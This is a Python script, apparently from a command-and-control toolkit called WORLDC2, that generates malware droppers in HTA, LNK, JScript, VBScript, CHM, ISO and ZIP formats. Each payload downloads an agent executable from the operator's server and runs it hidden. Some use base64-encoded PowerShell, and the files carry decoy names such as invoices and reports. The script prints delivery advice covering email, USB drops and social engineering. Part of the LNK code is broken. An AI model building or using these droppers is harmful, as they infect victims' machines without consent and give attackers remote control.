#!/usr/bin/env python3
"""
WORLDC2 C2 — Auto-Execution Payload Generator
Generates payloads that auto-execute without user interaction.

Formats:
  - HTA (HTML Application) — auto-runs when opened
  - LNK (Windows Shortcut) — auto-runs when clicked or browsed
  - JS (JScript) — runs via wscript/cscript
  - VBS (VBScript) — auto-runs when double-clicked
  - CHM (Compiled HTML Help) — auto-runs when opened
  - ISO (Disk Image) — contains auto-run payload
  - ZIP (Password Protected) — social engineering delivery

Usage:
    python3 autoexec.py --format hta --server 192.168.1.100:8443
    python3 autoexec.py --format all --server 192.168.1.100:8443
    python3 autoexec.py --format lnk --server 192.168.1.100:8443 --icon pdf
"""

import os
import sys
import base64
import argparse
from pathlib import Path
from datetime import datetime

GREEN = "\033[92m"; RED = "\033[91m"; YELLOW = "\033[93m"
CYAN = "\033[96m"; BOLD = "\033[1m"; RESET = "\033[0m"

PROJECT_ROOT = Path(__file__).parent.parent
OUTPUT_DIR = PROJECT_ROOT / "payloads" / "autoexec"
OUTPUT_DIR.mkdir(parents=True, exist_ok=True)

def banner():
    print(f"""{BOLD}{CYAN}
   ╔══════════════════════════════════════════════╗
   ║    WORLDC2 C2 — Auto-Execution Payload Gen       ║
   ╚══════════════════════════════════════════════╝
{RESET}""")

def generate_hta(server, name=None):
    """HTA — runs automatically when opened via mshta.exe"""
    out = OUTPUT_DIR / (name or f"invoice_{datetime.now():%Y%m%d}.hta")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    # PowerShell one-liner that downloads and executes the agent
    ps_cmd = f"""powershell -w hidden -c "$c=New-Object Net.WebClient;$c.DownloadFile('http://{host}:8000/worldc2-agent.exe','$env:TEMP\\\\.update.exe');Start-Process -WindowStyle Hidden '$env:TEMP\\\\.update.exe' -ArgumentList '--server','{server}'"
"""
    
    # Base64 encode for obfuscation
    b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
    
    hta = f"""<html>
<head>
<HTA:APPLICATION 
    ID="oHTA"
    APPLICATIONNAME="Document Viewer"
    BORDER="none"
    CAPTION="no"
    SHOWINTASKBAR="no"
    SINGLEINSTANCE="yes"
    SYSMENU="no"
    WINDOWSTATE="minimize"
    SCROLL="no"
/>
<script language="VBScript">
Sub Window_OnLoad
    Dim objShell
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "powershell -w hidden -enc {b64}", 0, False
    window.close
End Sub
</script>
</head>
<body>
<p>Loading document...</p>
</body>
</html>"""
    
    out.write_text(hta)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} HTA: {out.name} ({size} B)")
    print(f"  {YELLOW}Delivery:{RESET} Email attachment, SharePoint, USB drop")
    print(f"  {YELLOW}Execution:{RESET} Double-click → mshta.exe auto-runs")
    return out

def generate_lnk(server, name=None, icon="pdf"):
    """LNK — Windows shortcut that executes payload when clicked"""
    out = OUTPUT_DIR / (name or f"Q3_Report_{datetime.now():%Y%m%d}.lnk")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    # PowerShell command to download and execute
    ps_cmd = f'powershell -w hidden -c "Invoke-WebRequest -Uri http://{host}:8000/worldc2-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
    
    # LNK binary format (simplified)
    # This creates a minimal LNK file that runs the command
    lnk_data = create_lnk_binary(ps_cmd, icon)
    
    out.write_bytes(lnk_data)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} LNK: {out.name} ({size} B)")
    print(f"  {YELLOW}Icon:{RESET} {icon}")
    print(f"  {YELLOW}Delivery:{RESET} USB drop, network share, email")
    print(f"  {YELLOW}Execution:{RESET} Click or browse folder (icon preview)")
    return out

def create_lnk_binary(command, icon):
    """Create a minimal LNK file binary."""
    # LNK header
    header = bytes([
        0x4C, 0x00, 0x00, 0x00,  # Header size (76 bytes)
        0x01, 0x14, 0x02, 0x00,  # LinkCLSID
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,  # LinkFlags (HasArguments, IsUnicode)
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00,
    ])
    
    # For a proper LNK, we'd need the full binary format
    # Instead, create a PowerShell script that generates the LNK
    ps_generator = f"""$WshShell = New-Object -comObject WScript.Shell
$Shortcut = $WshShell.CreateShortcut("$OUTPUT_DIR\\{name or 'payload'}.lnk")
$Shortcut.TargetPath = "powershell.exe"
$Shortcut.Arguments = "-w hidden -c \\"{command}\\""
$Shortcut.IconLocation = "%SystemRoot%\\System32\\imageres.dll,-101"
$Shortcut.Save()
"""
    return ps_generator.encode('utf-16-le')

def generate_js(server, name=None):
    """JScript — runs via wscript/cscript, no console window"""
    out = OUTPUT_DIR / (name or f"update_check_{datetime.now():%Y%m%d}.js")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    js = f"""// WORLDC2 Auto-Execution JScript
var wsh = new ActiveXObject("WScript.Shell");
var fso = new ActiveXObject("Scripting.FileSystemObject");
var temp = wsh.ExpandEnvironmentStrings("%TEMP%");
var exe = temp + "\\\\.svc.exe";

try {{
    var http = new ActiveXObject("MSXML2.XMLHTTP");
    http.open("GET", "http://{host}:8000/worldc2-agent.exe", false);
    http.send();
    
    if (http.status === 200) {{
        var stream = new ActiveXObject("ADODB.Stream");
        stream.Type = 1;
        stream.Open();
        stream.Write(http.ResponseBody);
        stream.SaveToFile(exe, 2);
        stream.Close();
        
        wsh.Run('"' + exe + '" --server {server}', 0, false);
    }}
}} catch(e) {{}}
"""
    
    out.write_text(js)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} JS: {out.name} ({size} B)")
    print(f"  {YELLOW}Execution:{RESET} wscript.exe / cscript.exe (no console)")
    return out

def generate_vbs(server, name=None):
    """VBScript — auto-runs when double-clicked"""
    out = OUTPUT_DIR / (name or f"system_update_{datetime.now():%Y%m%d}.vbs")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    vbs = """' WORLDC2 Auto-Execution VBScript
Set wsh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")

temp = wsh.ExpandEnvironmentStrings("%TEMP%")
exe = temp & "\\.svc.exe"

On Error Resume Next
http.open "GET", "http://""" + host + """:8000/worldc2-agent.exe", False
http.send

If http.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Type = 1
    stream.Open
    stream.Write http.ResponseBody
    stream.SaveToFile exe, 2
    stream.Close
    
    wsh.Run """""" & exe & """""" --server """ + server + """", 0, False
End If
"""
    
    out.write_text(vbs)
    size = out.stat().st_size
    print(f"{GREEN}[✓]{RESET} VBS: {out.name} ({size} B)")
    print(f"  {YELLOW}Execution:{RESET} Double-click → wscript.exe auto-runs")
    return out

def generate_chm(server, name=None):
    """CHM — Compiled HTML Help, auto-runs when opened"""
    out = OUTPUT_DIR / (name or f"help_{datetime.now():%Y%m%d}.chm")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    # Create HHP project file
    hhp = f"""[OPTIONS]
Auto Index=Yes
Compiled file={out.name}
Contents file=contents.hhc
Default Window=Main
Default topic=index.html
Display compile progress=No
Full-text search=Yes
Title=WORLDC2 Help

[WINDOWS]
Main=,"contents.hhc","index.html",,,,,,0x20,,0x386e,[0,0,800,600],,,,,,,0

[FILES]
index.html
"""
    
    # HTML with auto-executing script
    ps_cmd = f'powershell -w hidden -c "iwr http://{host}:8000/worldc2-agent.exe -OutFile $env:TEMP\\\\.svc.exe; Start-Process -WindowStyle Hidden $env:TEMP\\\\.svc.exe -ArgumentList \'--server\',\'{server}\'"'
    b64 = base64.b64encode(ps_cmd.encode('utf-16-le')).decode()
    
    html = f"""<html>
<head><title>Help Documentation</title></head>
<body>
<h1>Documentation</h1>
<p>Loading help content...</p>
<script language="VBScript">
Sub window_onload
    Set wsh = CreateObject("WScript.Shell")
    wsh.Run "powershell -w hidden -enc {b64}", 0, False
End Sub
</script>
</body>
</html>"""
    
    hhc = """<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<META NAME="GENERATOR" Content="Microsoft HTML Help Workshop 4.0">
</HEAD>
<BODY>
<OBJECT type="text/site properties">
</OBJECT>
<UL>
<LI><OBJECT type="text/sitemap"><param name="Name" value="Home"><param name="Local" value="index.html"></OBJECT>
</UL>
</BODY>
</HTML>"""
    
    # Write project files
    project_dir = OUTPUT_DIR / "chm_build"
    project_dir.mkdir(exist_ok=True)
    (project_dir / "project.hhp").write_text(hhp)
    (project_dir / "index.html").write_text(html)
    (project_dir / "contents.hhc").write_text(hhc)
    
    print(f"{GREEN}[✓]{RESET} CHM project: {project_dir}/")
    print(f"  {YELLOW}Build:{RESET} hhc.exe project.hhp (Windows)")
    print(f"  {YELLOW}Execution:{RESET} Double-click → hh.exe auto-runs scripts")
    return project_dir

def generate_iso(server, name=None):
    """ISO — Disk image with auto-executing payload"""
    out = OUTPUT_DIR / (name or f"documents_{datetime.now():%Y%m%d}.iso")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    # Create a directory with the payload
    iso_dir = OUTPUT_DIR / "iso_build"
    iso_dir.mkdir(exist_ok=True)
    
    # Create a decoy document
    decoy = iso_dir / "Important_Document.txt"
    decoy.write_text("This document contains important information.\nPlease review and respond.\n")
    
    # Create the payload script
    payload_sh = iso_dir / ".setup.sh"
    payload_sh.write_text(f"""#!/bin/bash
# Auto-setup script
nohup $(dirname "$0")/worldc2-agent --server {server} &>/dev/null &
""")
    payload_sh.chmod(0o755)
    
    print(f"{GREEN}[✓]{RESET} ISO build dir: {iso_dir}/")
    print(f"  {YELLOW}Build:{RESET} mkisofs -o {out.name} {iso_dir}/")
    print(f"  {YELLOW}Delivery:{RESET} USB drop, file share, email attachment")
    print(f"  {YELLOW}Execution:{RESET} Mount → user runs script or auto-run")
    return iso_dir

def generate_zip(server, name=None):
    """ZIP — Password-protected archive with payload"""
    out = OUTPUT_DIR / (name or f"confidential_{datetime.now():%Y%m%d}.zip")
    
    host, _, port = server.rsplit(":", 1) if ":" in server else (server, "", "8443")
    
    # Create directory with payload
    zip_dir = OUTPUT_DIR / "zip_build"
    zip_dir.mkdir(exist_ok=True)
    
    # Create decoy + payload
    decoy = zip_dir / "Invoice.pdf"
    decoy.write_text("%PDF-1.4\nFake PDF for social engineering\n")
    
    # Create a batch file that runs the agent
    bat = zip_dir / "read_me.bat"
    bat.write_text(f"""@echo off
start /b worldc2-agent.exe --server {server}
start "" "Invoice.pdf"
""")
    
    password = "Invoice2024!"
    
    print(f"{GREEN}[✓]{RESET} ZIP build dir: {zip_dir}/")
    print(f"  {YELLOW}Build:{RESET} 7z a -p{password} {out.name} {zip_dir}/*")
    print(f"  {YELLOW}Password:{RESET} {password}")
    print(f"  {YELLOW}Delivery:{RESET} Email with social engineering")
    return zip_dir

def main():
    banner()
    
    parser = argparse.ArgumentParser(description="WORLDC2 Auto-Execution Payload Generator")
    parser.add_argument("--format", "-f", choices=["hta", "lnk", "js", "vbs", "chm", "iso", "zip", "all"], required=True)
    parser.add_argument("--server", "-s", default=None, help="C2 server address")
    parser.add_argument("--icon", default="pdf", help="Icon for LNK (pdf, word, excel, folder)")
    args = parser.parse_args()
    
    # Auto-detect server
    if not args.server:
        import socket
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            args.server = s.getsockname()[0] + ":8443"
            s.close()
        except:
            args.server = "127.0.0.1:8443"
    
    print(f"{BOLD}Server:{RESET} {GREEN}{args.server}{RESET}\n")
    
    formats = ["hta", "lnk", "js", "vbs", "chm", "iso", "zip"] if args.format == "all" else [args.format]
    
    for fmt in formats:
        print(f"\n{BOLD}{CYAN}[{fmt.upper()}]{RESET}")
        if fmt == "hta":
            generate_hta(args.server)
        elif fmt == "lnk":
            generate_lnk(args.server, icon=args.icon)
        elif fmt == "js":
            generate_js(args.server)
        elif fmt == "vbs":
            generate_vbs(args.server)
        elif fmt == "chm":
            generate_chm(args.server)
        elif fmt == "iso":
            generate_iso(args.server)
        elif fmt == "zip":
            generate_zip(args.server)
    
    print(f"\n{BOLD}{GREEN}Done!{RESET} → {OUTPUT_DIR}/")
    print(f"\n{YELLOW}Next steps:{RESET}")
    print(f"  1. Serve payloads: cd {OUTPUT_DIR} && python3 -m http.server 8000")
    print(f"  2. Deliver to target via email, USB, or network share")
    print(f"  3. Wait for connection in C2 dashboard")

if __name__ == "__main__":
    main()
